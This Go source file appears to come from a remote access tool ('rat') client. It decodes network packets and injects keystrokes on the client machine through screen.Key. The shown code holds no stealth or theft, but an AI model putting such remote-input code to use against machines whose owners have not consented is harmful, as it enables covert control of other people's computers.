package main

import (
	"fmt"
	"rat/client/screen"
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type KeyPacket struct {
	KeyCode int
	State   int
}

func (packet KeyPacket) Header() header.PacketHeader {
	return header.KeyHeader
}

func (packet KeyPacket) OnReceive() error {
	fmt.Println("key", packet)

	screen.Key(uint16(packet.KeyCode), packet.State)

	return nil
}

func (packet KeyPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
